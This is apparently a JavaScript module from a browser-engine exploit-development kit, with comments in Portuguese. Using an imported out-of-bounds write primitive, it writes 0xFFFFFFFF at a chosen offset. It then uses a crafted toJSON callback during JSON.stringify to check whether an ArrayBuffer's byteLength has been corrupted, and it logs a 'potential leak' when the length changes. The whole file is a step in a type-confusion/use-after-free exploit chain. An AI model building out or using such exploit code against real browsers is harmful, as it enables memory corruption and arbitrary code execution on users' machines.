// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeFocusedTestForTypeError, current_toJSON_call_count_for_TypeError_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs'; 
import { toHex } from '../utils.mjs';     

// Variante Y.1: Tenta ler this.byteLength
function toJSON_AttemptLeakByteLength() {
    // Não usar current_toJSON_call_count_for_TypeError_test++ aqui para evitar o TypeError conhecido.
    // Não usar logS3 aqui pelo mesmo motivo.
    // Não mudar document.title aqui pelo mesmo motivo.
    
    let len = "N/A_toJSON_AttemptLeakByteLength";
    let this_type = "N/A";
    let error_msg = null;

    try {
        this_type = Object.prototype.toString.call(this);
        if (this instanceof ArrayBuffer) {
            len = this.byteLength;
        } else {
            len = "this_is_not_ArrayBuffer";
        }
    } catch (e) {
        // Se o acesso a this.byteLength ou instanceof ArrayBuffer causar erro
        len = `EXCEPTION_ACCESSING_THIS: ${e.name} - ${e.message}`;
        error_msg = e.message;
        // Mudar o título aqui PODE ser um canary útil se o return falhar, mas também pode causar TypeError
        // document.title = `toJSON_LeakByteLength EXCEPTION`; 
    }
    
    // Retornar um objeto simples para JSON.stringify processar.
    // Se o próprio return causar o TypeError, saberemos.
    // Se JSON.stringify não conseguir serializar este objeto simples, também saberemos.
    return { 
        toJSON_executed: "toJSON_AttemptLeakByteLength",
        observed_this_type: this_type,
        observed_len: len,
        error_in_toJSON: error_msg
    };
}


async function runByteLengthLeakAttempt() {
    const FNAME_RUNNER = "runByteLengthLeakAttempt";
    logS3(`==== INICIANDO Tentativa de Leak de ByteLength via toJSON ====`, 'test', FNAME_RUNNER);

    const valueForCorruption = 0xFFFFFFFF;
    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const testDescription = `LeakByteLength_OOB_${toHex(valueForCorruption)}_at_${toHex(criticalOffset)}`;
    
    logS3(`\n--- Executando Teste: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
    
    let result = await executeFocusedTestForTypeError(
        testDescription,
        toJSON_AttemptLeakByteLength,
        valueForCorruption,
        criticalOffset
    );
    
    if (result.errorOccurred) {
        logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        if (result.errorOccurred.stack) logS3(`      Stack: ${result.errorOccurred.stack}`, "error");
    } else if (result.potentiallyCrashed) {
        logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL.`, "error", FNAME_RUNNER);
    } else {
        logS3(`   RESULTADO ${testDescription}: Completou sem erro explícito.`, "good", FNAME_RUNNER);
        logS3(`      Stringify Result: ${result.stringifyResult}`, "leak", FNAME_RUNNER); // Log completo do resultado

        // Análise do resultado do stringifyResult (que é o objeto retornado pela toJSON)
        if (result.stringifyResult && typeof result.stringifyResult === 'object') {
            if (result.stringifyResult.toJSON_executed === "toJSON_AttemptLeakByteLength") {
                logS3(`      toJSON_AttemptLeakByteLength foi executada.`, "info", FNAME_RUNNER);
                logS3(`      Tipo de 'this' observado na toJSON: ${result.stringifyResult.observed_this_type}`, "info", FNAME_RUNNER);
                logS3(`      ByteLength observado na toJSON: ${result.stringifyResult.observed_len}`, "leak", FNAME_RUNNER);
                if (result.stringifyResult.error_in_toJSON) {
                    logS3(`      Erro DENTRO da toJSON: ${result.stringifyResult.error_in_toJSON}`, "warn", FNAME_RUNNER);
                }
                if (result.stringifyResult.observed_this_type === "[object ArrayBuffer]" && 
                    typeof result.stringifyResult.observed_len === 'number' &&
                    result.stringifyResult.observed_len !== 64) {
                    logS3(`      !!!! POTENCIAL LEAK/CORRUPÇÃO DE TAMANHO DETECTADA !!!! Tamanho observado: ${result.stringifyResult.observed_len}`, "critical", FNAME_RUNNER);
                    document.title = `POTENCIAL LEAK/CORRUPÇÃO TAMANHO: ${result.stringifyResult.observed_len}`;
                }
            }
        }
    }
    logS3(`   Título da página ao final de ${testDescription}: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Tentativa de Leak de ByteLength via toJSON CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_AttemptByteLengthLeak';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Tentativa de Leak de ByteLength via toJSON Pós-Corrupção ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Leak ByteLength";
    
    await runByteLengthLeakAttempt();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Tentativa de Leak de ByteLength) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.startsWith("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("ERRO") || document.title.includes("EXCEPTION")) {
        // Manter título de erro
    } else if (document.title.includes("POTENCIAL LEAK")) {
        // Manter título de leak
    }
    else {
        document.title = "Script 3 Concluído - Leak ByteLength";
    }
}
